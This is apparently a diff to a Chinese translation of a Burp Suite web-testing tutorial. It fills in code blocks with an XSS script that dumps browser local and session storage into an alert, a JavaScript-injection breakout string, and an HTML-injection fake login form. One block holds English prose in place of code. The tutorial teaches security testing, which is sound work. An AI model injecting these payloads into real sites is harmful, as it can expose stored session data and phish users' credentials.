@@ -98,7 +98,9 @@
 
 1.  用以下脚本替换前面高亮显示的`User-Agent`：
 
-[PRE0]
+```
+<script>try{var m = "";var l = window.localStorage; var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};alert(m);}catch(e){alert(e.message);}</script>
+```
 
 1.  点击“Forward”按钮。现在，通过点击拦截器关闭按钮来关闭拦截器。
 
@@ -142,7 +144,9 @@ JavaScript 注入是跨站脚本攻击的一个子类型，特指对 JavaScript 
 
 1.  用以下精心制作的 JavaScript 注入脚本替换前面高亮显示的`anonymous`值：
 
-[PRE1]
+```
+canary";}catch(e){}alert(1);try{a="
+```
 
 1.  点击“Forward”按钮。现在，通过点击拦截器关闭按钮来关闭拦截器。
 
@@ -152,7 +156,9 @@ JavaScript 注入是跨站脚本攻击的一个子类型，特指对 JavaScript 
 
 # 工作原理...
 
-[PRE2]
+```
+canary and ending the statement with a semicolon, a specially crafted *new* catch block was created, which contained the malicious JavaScript payload.
+```
 
 # 测试 HTML 注入
 
@@ -180,7 +186,9 @@ HTML 注入是将任意 HTML 代码插入易受攻击的网页。该领域的漏
 
 1.  在请求暂停时，用这个 HTML 注入脚本替换最后一个 cookie 的值：
 
-[PRE3]
+```
+<h1>Sorry, please login again</h1><br/>Username<input type="text"><br/>Password<input type="text"><br/><input type="submit" value="Submit"><h1>&nbsp;</h1>
+```
 
 1.  点击“Forward”按钮。现在通过单击拦截器按钮将拦截器关闭。
 
